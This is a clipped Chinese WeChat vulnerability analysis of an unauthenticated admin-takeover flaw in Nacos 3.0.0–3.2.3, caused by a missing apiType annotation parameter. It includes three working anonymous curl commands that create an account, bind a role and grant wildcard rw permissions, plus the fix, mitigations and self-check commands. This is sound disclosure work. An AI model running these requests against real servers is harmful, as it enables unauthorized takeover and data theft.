---
title: 【微信】一个漏写的注解参数，把 Nacos 管理面交给了匿名请求
source: https://mp.weixin.qq.com/s/wWxvN-TQNWHb48O0pt3Vmw
source_host: mp.weixin.qq.com
clip_date: 2026-10-31T04:12:43+08:00
trace_id: 093e9bfe-1755-4a2b-92e9-dedd9b3a944a
content_hash: 8b7da31385e554c75945a5b9d9e71257104c23f0b153189db9638fa5cf804e59
status: synced
tags:
  - 微信
  - 漏洞分析
  - 权限绕过
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Nacos 3.0.0–3.2.3 管理接口漏写 `apiType` 注解参数，落入默认关闭的普通鉴权链，匿名即可建号授权接管管理面，3.2.4 修复。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 40975244-d011-81c3-a679-e97bcd138cb7
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Nacos 3.0.0–3.2.3 管理接口漏写 `apiType` 注解参数，落入默认关闭的普通鉴权链，匿名即可建号授权接管管理面，3.2.4 修复。
> 
> - **缺陷三环：** `@Secured` 的 `apiType` 默认 `OPEN_API`，用户/角色/权限三组管理接口均未显式声明；请求由 `AuthFilter` 处理，其开关 `nacos.core.auth.enabled` 出厂默认 false 直接放行，而管 ADMIN_API 的 `AuthAdminFilter` 开关默认开启，两条链默认值相反，错配即成未授权访问（CVSS 9.8）。
> - **零凭证复现：** 三条 curl 匿名完成建号、绑角色、授予 `*:*:* rw`，全部 200；`ROLE_ADMIN` 虽被禁止直接创建，但自建角色配通配权限即可绕开；用户列表接口还会泄露 BCrypt 密码哈希。
> - **ADMIN_API 仅剩「有 token」约束：** 无 token 访问配置列表返回 403，持通配 token 则 200——`AuthAdminFilter` 只做分流，权限判定仍走 `hasPermission()` 资源模式匹配，`*:*:*` 对任意资源命中，并可进一步发布配置写入闭环。
> - **修复与缓解：** 3.2.4 给 13 处注解补上 `apiType = ApiType.ADMIN_API`，同请求下匿名返回 403 `access denied`；短期可开启 `nacos.core.auth.enabled=true` 或将 8848 端口收敛至内网。
> - **失陷自查：** 未授权请求 `/v3/auth/user/list` 返回 200 即按失陷处理——清除非预期账号与角色、检查残留 `*:*:*` 通配权限、轮换配置中的密钥数据后升级。

**松杨网络安全资料库** *2026年10月30日 17:25*

一、漏洞背景

Nacos 3.0.0 到 3.2.3 存在一处鉴权作用域错配：用户、角色、权限三组管理接口在 `@Secured` 注解里漏写了 `apiType = ApiType.ADMIN_API` ，注解默认值把请求送进了「普通 API」那条链。而普通 API 的鉴权开关出厂默认关闭，管理 API 的开关出厂默认打开。两条链的默认状态正好相反，错配就变成了未授权。

| 项   | 值   |
| --- | --- |
| 漏洞类型 | 权限绕过 / 未授权访问 |
| 影响版本 | 3.0.0 ≤ Nacos ≤ 3.2.3 |
| 修复版本 | 3.2.4（2026-08-27 发布） |
| CVSS 3.1 | 9.8（通告值） |
| 利用前置 | 能访问 Nacos Server 端口，无需任何凭证 |
| 在野利用 | 未发现公开记录 |

缺陷链可以拆成三环，串联起来现成漏洞：

| 环节  | 事实  | 后果  |
| --- | --- | --- |
| 注解默认值 | `apiType()`<br><br>默认 `OPEN_API` | 不写就落进普通 API |
| 过滤器分流 | `AuthFilter`<br><br>管非 ADMIN_API，<br><br>`AuthAdminFilter` 只管 ADMIN_API | 两条链各有独立开关 |
| 开关默认值 | `nacos.core.auth.enabled=false`<br><br>， `nacos.core.auth.admin.enabled=true` | 普通链关着，管理链接着 |

## 二、漏洞原理

### 2.1 注解里的默认值，决定了走哪条链

`@Secured` 是 Nacos 服务端做接口鉴权的入口注解， `apiType` 属性用来区分这个接口属于「管理 API」还是「开放 API」：

```
// auth/src/main/java/com/alibaba/nacos/auth/annotation/Secured.java:80
ApiType apiType() default ApiType.OPEN_API;
```

默认值是 `OPEN_API` 。也就是说，一个接口只要写了 `@Secured` 但没显式声明 `apiType` ，它就会被当成开放接口处理。这个默认值本身是为了兼容历史接口，但对新增的管理接口来说，忘记写就等于放弃了管理员校验。

3.2.3 的 `UserControllerV3.createUser` 就是这样：

```typescript
// 3.2.3 UserControllerV3.java:109
@Secured(resource = AuthConstants.CONSOLE_RESOURCE_NAME_PREFIX + "users",
    action = ActionTypes.WRITE)// 没有 apiType
@PostMapping
public Result<String> createUser(@RequestParam String username, @RequestParam String password)
```

### 2.2 两个过滤器读两个开关，默认值正好错开

`apiType` 不是装饰，它直接决定请求进哪个过滤器：

```css
// core/.../auth/AuthFilter.java:53       —— 处理非 ADMIN_API
return !ApiType.ADMIN_API.equals(secured.apiType());

// core/.../auth/AuthAdminFilter.java:47  —— 只处理 ADMIN_API
return ApiType.ADMIN_API.equals(secured.apiType());
```

两个过滤器各自读一个开关，而这两个开关的出厂默认值是一对反义词：

| 过滤器 | 覆盖范围 | 开关  | 出厂默认 | 未认证请求的结果 |
| --- | --- | --- | --- | --- |
| `AuthFilter` | 除 ADMIN_API 外的全部 | `nacos.core.auth.enabled` | **false** | 直接放行 |
| `AuthAdminFilter` | 仅 ADMIN_API | `nacos.core.auth.admin.enabled` | **true** | 校验管理员身份，拒绝 |

## 三、漏洞复现

### 3.1 环境

| 项   | 值   |
| --- | --- |
| 镜像  | `nacos/nacos-server:3.2.3`<br><br>，官方默认配置，未改任何鉴权项 |
| 部署  | Docker 单容器，standalone + 内嵌 Derby |
| 端口  | 8848（Server API，context-path `/nacos` ）、8080（Console） |
| 内存  | JVM 512m–1g |

镜像里的 `conf/application.properties` 把三个开关写成了硬编码，不是环境变量占位符，所以默认部署就是这个状态：

```toml
nacos.core.auth.enabled=false          # 普通 API 鉴权：关
nacos.core.auth.admin.enabled=true     # Admin API 鉴权：开
nacos.core.auth.console.enabled=true   # Console 鉴权：开
```

### 3.2 三个写操作，零凭证

建号、绑角色、授权三步，全部匿名完成：

```powershell
curl -X POST "http://192.168.x.x:8848/nacos/v3/auth/user?username=hacker01&password=Hacker%40123"
curl -X POST "http://192.168.x.x:8848/nacos/v3/auth/role?role=evil_role&username=hacker01"
curl -X POST "http://192.168.x.x:8848/nacos/v3/auth/permission?role=evil_role&resource=*:*:*&action=rw"
```

> **【图 1】三个写操作零凭证通过，第四步登录后拿到配置全量列表**
> 
> ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/53f6b7218fd54e2c.png)

返回体分别是 `create user ok!`、 `add role ok!`、 `add permission ok!`，HTTP 状态全为 200。同一时刻，标了 `ADMIN_API` 的配置列表接口对匿名请求返回 403，两者的差别只在于注解里那一个属性。

`ROLE_ADMIN` 这个名字在代码里被保护， `addRole` 会拒绝直接创建：

```
// NacosRoleServiceDirectImpl.java:130
if (AuthConstants.GLOBAL_ADMIN_ROLE.equals(role)) {
    throw new IllegalArgumentException("role 'ROLE_ADMIN' is not permitted to create!");
}
```

但绕开它不需要改名，把角色和自己绑定，再给角色授予 `*:*:*` 加 `rw` 就够了。

### 3.3 登录之后，管理面全开

用新建账号换 token，返回里 `globalAdmin=false` ：

```json
{"accessToken":"eyJhbGciOiJIUzM4NCJ9...","tokenTtl":18000,
 "globalAdmin":false,"username":"hacker01"}
```

不是全局管理员，但带着这个 token 访问 `ADMIN_API` 的配置列表，依然是 200。原因是 `AuthAdminFilter` 只负责把请求分流到 admin 链，进链之后的权限判定仍然走普通的 `hasPermission()` ，按资源模式匹配。 `*:*:*` 对任意资源都命中，所以 `ADMIN_API` 标签的实际约束就只剩下「要有一个 token」。

实测影响面：

| 接口  | 无凭证 | 持通配 token |
| --- | --- | --- |
| `GET /v3/auth/user/list` | 200，含 BCrypt 密码哈希 | 200 |
| `GET /v3/auth/role/list` | 200 | 200 |
| `GET /v3/auth/permission/list` | 200 | 200 |
| `POST /v3/auth/user` | 200 | 200 |
| `POST /v3/auth/role` | 200 | 200 |
| `POST /v3/auth/permission` | 200 | 200 |
| `GET /v3/admin/cs/config/list` | 403 | 200 |
| `GET /v3/console/cs/config/list` | 403 | 200 |

写入闭环也验证过：带 token 往 `DEFAULT_GROUP` 发布一条配置，HTTP 200，回读内容与 md5 一致。

## 四、修复方式

### 4.1 官方修复

3.2.4 的 release notes 把这一项列在 BugFix 里：

> #15634 #15563 Fix authorization metadata and resource parsing across Admin, HTTP/gRPC, Prometheus, and AgentSpec APIs.

落到代码上，就是给 13 处注解逐条补上 `apiType` ：

```
-        action = ActionTypes.WRITE)
+        action = ActionTypes.WRITE, apiType = ApiType.ADMIN_API)
```

### 4.2 修复前后对照

对照组只换镜像版本，请求与参数完全一致：

| 请求  | 3.2.3 | 3.2.4 |
| --- | --- | --- |
| `POST /v3/auth/user` | 200 `create user ok!` | 403 `access denied` |
| `POST /v3/auth/role` | 200 `add role ok!` | 403 |
| `POST /v3/auth/permission` | 200 `add permission ok!` | 403 |
| `GET /v3/auth/user/list` | 200，带密码哈希 | 403 |

两个版本对匿名请求的拒绝文案是一样的，都是 `access denied` 套一层 `Code: 401, Message: User not found` ，因为都从 `AuthFilter` 的 `AccessException` 抛出。差别只在拦不拦得住，不在提示语。

### 4.3 缓解与自查

升级到 3.2.4 是首选。短期不能升的，按下面顺序处理：

| 措施  | 做法  | 代价  |
| --- | --- | --- |
| 打开普通鉴权 | `nacos.core.auth.enabled=true` | 客户端 SDK 需带凭证，<br><br>漏洞链随之失效 |
| 收敛暴露面 | 8848 只对业务网段放行，不对公网开放 | 需梳理调用方 |
| 检查异常账号 | 查 `/v3/auth/user/list` 有无非预期账号 | 需管理员权限，可脚本化 |
| 检查通配权限 | 查 `/v3/auth/permission/list` 有无 `*:*:*` | 同上  |

自查可以用两条命令判断是否已被利用：

```powershell
# 1) 未授权就能读用户列表 = 中招
curl -s -o /dev/null -w '%{http_code}\n' \
  "http://<target>:8848/nacos/v3/auth/user/list?pageNo=1&pageSize=1&username="

# 2) 有无残留的通配权限
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://<target>:8848/nacos/v3/auth/permission/list?pageNo=1&pageSize=50&role=<role>"
```

第一条返回 200 就要按失陷处理：清掉非预期账号与角色，轮换配置里的密钥类数据，再升级。
